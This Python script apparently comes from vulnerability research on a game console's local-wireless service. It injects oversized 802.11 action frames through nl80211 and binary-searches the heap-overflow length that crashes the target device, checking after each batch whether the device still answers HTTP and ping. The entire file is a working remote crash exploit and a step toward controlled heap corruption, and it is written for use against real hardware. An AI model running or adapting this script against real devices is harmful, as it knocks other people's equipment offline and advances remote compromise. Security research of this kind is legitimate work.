#!/usr/bin/env python3
"""Binary search for the exact heap overflow boundary that causes a crash.

Phase 1 results: 64 bytes overflow = OK, 644 bytes = CRASH.
Something between offset 64 and 644 (from parser+0x5D8) is critical.
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_body(body_size, payload_size=0x100):
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, payload_size)
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test_overflow(fam_id, ifindex, body_size, frame_count=100):
    """Returns True if the sysmodule survives, False if it crashes."""
    if not check_alive():
        if not wait_alive(30):
            return None

    body = build_body(body_size)
    frame = build_frame(body)

    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            break
        time.sleep(0.002)

    time.sleep(3)
    alive = check_alive()
    ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                           capture_output=True).returncode == 0

    time.sleep(5)
    alive2 = check_alive()
    ping2 = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0

    survived = alive2 and ping2
    return survived


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")
    print()

    # Known: overflow=64 (body=0x5BC) = OK, overflow=644 (body=0x800) = CRASH
    # Binary search for the boundary

    results = []

    # First, verify the bounds
    print("Verifying bounds...")
    ok_bound = 0x5BC   # 64 bytes overflow = OK
    crash_bound = 0x800  # 644 bytes overflow = CRASH

    r = test_overflow(fam_id, ifindex, ok_bound)
    print(f"  body_size=0x{ok_bound:04x} (overflow={ok_bound-0x57C:3d}B): {'OK' if r else 'CRASH'}")
    if not r:
        print("  Lower bound failed! Adjusting...")
        ok_bound = 0x57C
        time.sleep(15)
        wait_alive(30)

    r = test_overflow(fam_id, ifindex, crash_bound)
    print(f"  body_size=0x{crash_bound:04x} (overflow={crash_bound-0x57C:3d}B): {'OK' if r else 'CRASH'}")
    if r:
        print("  Upper bound survived! No crash at max. Exiting.")
        return
    time.sleep(15)
    wait_alive(30)

    # Binary search
    print(f"\nBinary searching between overflow={ok_bound-0x57C} and {crash_bound-0x57C} bytes...")
    lo = ok_bound
    hi = crash_bound

    while hi - lo > 4:
        mid = ((lo + hi) // 2) & ~3  # align to 4 bytes
        if mid == lo:
            mid = lo + 4
        if mid >= hi:
            break

        r = test_overflow(fam_id, ifindex, mid)
        if r is None:
            print(f"  body_size=0x{mid:04x}: Switch unreachable, skipping")
            time.sleep(20)
            wait_alive(30)
            continue

        overflow = mid - 0x57C
        status = "OK" if r else "CRASH"
        print(f"  body_size=0x{mid:04x} (overflow={overflow:3d}B, heap_offset=0x{overflow:03x}): {status}")
        results.append({"body_size": mid, "overflow": overflow, "status": status})

        if r:
            lo = mid
        else:
            hi = mid
            time.sleep(15)
            wait_alive(30)

    # Fine-grained search around the boundary
    print(f"\nFine-grained search: overflow {lo-0x57C} to {hi-0x57C} bytes")
    for bs in range(lo, hi + 1):
        r = test_overflow(fam_id, ifindex, bs)
        if r is None:
            time.sleep(20)
            wait_alive(30)
            continue

        overflow = bs - 0x57C
        status = "OK" if r else "CRASH"
        print(f"  body_size=0x{bs:04x} (overflow={overflow:3d}B, heap_offset=0x{overflow:03x}): {status}")
        results.append({"body_size": bs, "overflow": overflow, "status": status})

        if not r:
            print(f"\n  *** CRASH BOUNDARY: overflow={overflow} bytes (heap offset 0x{overflow:03x}) ***")
            print(f"  *** = parser+0x5D8+0x{overflow:03x} = parser+0x{0x5D8+overflow:04x} ***")
            break
        if not r:
            time.sleep(15)
            wait_alive(30)

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "heap_boundary_bsearch.json")
    with open(outfile, "w") as f:
        json.dump({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "results": results}, f, indent=2)
    print(f"\nSaved to {outfile}")


if __name__ == "__main__":
    main()
